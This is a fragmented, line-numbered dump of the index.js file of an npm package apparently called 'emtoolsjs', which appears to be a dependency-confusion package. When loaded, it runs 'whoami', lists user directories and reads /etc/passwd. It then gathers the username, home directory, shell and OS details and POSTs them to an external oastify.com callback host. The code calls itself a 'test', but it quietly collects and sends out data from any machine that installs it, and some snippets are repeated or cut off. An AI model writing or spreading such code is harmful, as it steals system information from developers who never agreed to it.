// File: tmp/tmpry7aar2m/emtoolsjs/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: _tmp_5 = require('child_process')
Line 3: const os = require('os')
Line 6: {
    const options = {
        hostname: 'xgh26mm3bfptope44shgnm02htnmbdz2.oastify.com', 
        port: 443,
        path: '/callback',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => process.stdout.write(d));
    });

    req.on('error', (error) => {
        console.error(`Error al enviar datos: ${error.message}`);
    });

    req.write(data);
    req.end();
}
Line 18: const req = https.request(options, (res) => {
        res.on('data', (d) => process.stdout.write(d));
    })
Line 26: req.write(data)
Line 27: req.end()
Line 31: {
    const platform = os.platform(); 

    let command = '';
    if (platform === 'win32') {
        
        command = 'whoami && dir C:\\Users';
    } else {
        
        command = 'whoami && ls /home && cat /etc/passwd';
    }

   
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error al ejecutar comandos: ${error.message}`);
            return;
        }

        
        const systemData = {
            message: 'Dependency Confusion Test - Safe Directory Listing and User Info',
            platform: platform,
            commandOutput: stdout,  
            errorOutput: stderr,    
            environmentVars: {
                username: os.userInfo().username,
                homedir: os.homedir(),
                shell: os.userInfo().shell || "N/A", 
                osType: os.type(),
                osRelease: os.release()
            }
        };

        const payload = JSON.stringify(systemData);
        sendData(payloa...
Line 32: os.platform()
Line 44: exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error al ejecutar comandos: ${error.message}`);
            return;
        }

        
        const systemData = {
            message: 'Dependency Confusion Test - Safe Directory Listing and User Info',
            platform: platform,
            commandOutput: stdout,  
            errorOutput: stderr,    
            environmentVars: {
                username: os.userInfo().username,
                homedir: os.homedir(),
                shell: os.userInfo().shell || "N/A", 
                osType: os.type(),
                osRelease: os.release()
            }
        };

        const payload = JSON.stringify(systemData);
        sendData(payload);
    })
Line 57: os.userInfo()
Line 59: os.userInfo()
Line 60: os.type()
Line 66: sendData(payload)
Line 71: gatherSystemData()
